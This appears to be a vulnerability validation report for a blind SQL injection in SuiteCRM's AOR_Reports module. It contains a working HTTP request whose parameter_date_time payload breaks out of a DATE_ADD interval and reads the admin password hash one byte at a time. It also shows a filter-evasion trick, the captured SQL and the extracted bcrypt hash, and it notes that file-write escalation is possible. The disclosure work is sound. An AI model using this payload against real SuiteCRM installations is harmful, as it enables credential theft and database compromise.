# VULN-016 — AOR_Reports `DATE_ADD` interval SQL injection → full authenticated DB read

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: Critical
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: 2026-09-28

## Preconditions
- One ordinary account (created by the exploit as admin: a fresh RegularUser, `is_admin=0`, no roles) with default access to the **Reports (AOR_Reports)** module.
- The attacker creates **their own** AOR report with a "Date" condition flagged as a runtime parameter (`value_type=Date`, `parameter=1`), saved through the report's own `AOR_Report::save()` → `save_lines()` path. No admin privilege is used for the attack itself; admin is used only to mint the throwaway low-priv account.

## Request
The injection request (see `request.http`), abbreviated:
```
POST /index.php
Cookie: PHPSESSID=<low-priv session>
Content-Type: application/x-www-form-urlencoded

module=AOR_Reports&action=changeReportPage&record=<RID>
&parameter_id[0]=<CID>&parameter_type[0]=Date&parameter_operator[0]=Equal_To
&parameter_value[0]=now&parameter_date_value[0]=now&parameter_date_sign[0]=plus
&parameter_date_number[0]=1
&parameter_date_time[0]=DAY) OR (ORD(SUBSTRING((SELECT user_hash FROM users WHERE user_name=0x61646d696e),1,1)) BETWEEN 36 AND 36)) AND ((1=1
```
`parameter_date_time[0]` is the interval-unit token; it is concatenated raw into the `DATE_ADD` interval.

## Response
See `response.txt`. The report AJAX fragment is the 1-bit oracle:
- **ORACLE=TRUE** (admin `user_hash` byte 1 == `$`, ORD 36): `HTTP 200 content-length=6247` — report table populated with account rows.
- **ORACLE=FALSE** (byte 1 in 37..90): `HTTP 200 content-length=3145` — empty report body.

The actual SQL the app executed (captured from the MySQL general log, `evidence/injected_sql.txt`):
```sql
SELECT count(*) c FROM (SELECT `accounts`.name AS 'Name0', `accounts`.id AS 'accounts_id'
  FROM `accounts`  WHERE ( `accounts`.date_entered = DATE_ADD(NOW(), INTERVAL + 1 DAY)
  OR (ORD(SUBSTRING((SELECT user_hash FROM users WHERE user_name=0x61646d696e),1,1)) BETWEEN 36 AND 36))
  AND ((1=1) ) AND  accounts.deleted = 0 ) as n
```
The `DAY) OR (...)) AND ((1=1` payload breaks out of `INTERVAL + 1 <unit>`, closes the `DATE_ADD` and the outer condition group, and appends an attacker-chosen boolean.

## Observation
Matches the static finding exactly. The interval-unit token (`$params[3]`, from `$_REQUEST['parameter_date_time']`) is interpolated raw at `AOR_Report.php:1722`. `securexss` HTML-encodes `< > " ' &` but not parentheses, spaces, commas, `=`, `!`, or SQL keywords, so a quote-free boolean payload injects cleanly. (I confirmed the `>` mangling directly: `ORD(...)>N` payloads always returned FALSE because `>`→`&gt;` broke the SQL; switching to `BETWEEN`/`STRCMP` — no `<`/`>` — restored the oracle. `STRCMP` under the default `_ci` collation folded case, so the byte-exact extraction uses `ORD()` + `BETWEEN`.)

The exploit extracted the full admin bcrypt hash byte-by-byte and it matches the DB **exactly**:
```
extracted: $2y$10$Fxtha9NR3xJMdYCmjiuJOOz4VXvBGT82.iphvi5H8sThFdZTYAC0W
DB truth : $2y$10$Fxtha9NR3xJMdYCmjiuJOOz4VXvBGT82.iphvi5H8sThFdZTYAC0W   (*** EXACT MATCH ***)
```

## Side effects
- Creates one throwaway RegularUser (`mod_<rand>`) and one AOR_Reports report (+1 field, +1 condition) owned by that user. No data is modified; the injection is read-only (`SELECT`). Cleanup is optional — the report and user can be deleted from the admin UI. General query logging was toggled only to capture the SQL for evidence and is turned back OFF.
- The report query runs under the app's DB account, which in this lab is the privileged **root** MySQL user (see manifest) → the same primitive supports `SELECT ... INTO OUTFILE` (file-write/RCE) subject to `secure_file_priv`.

## Research & references
- OWASP WSTG-INPV-05 (SQL Injection) and the OWASP "Blind SQL Injection" cheat sheet — boolean-based inference technique (page-content differential as the oracle).
- PortSwigger Web Security Academy — "Blind SQL injection" (conditional responses) — used the "trigger a detectable difference in the application's responses" methodology; adapted the character-comparison to `ORD()`+`BETWEEN` to survive `securexss`'s `<`/`>` encoding.
- Class anchor: GHSA-pqq6-v2mj-hrm2 / CVE-2026-71548 (AOR_Reports `parameter_value` SQLi, full-DB read). Same WHERE-builder family; this fork commit ships the vulnerable `DATE_ADD` interval sink verbatim.

## If FAILED
n/a — CONFIRMED.

## If NEEDS_MANUAL
n/a.
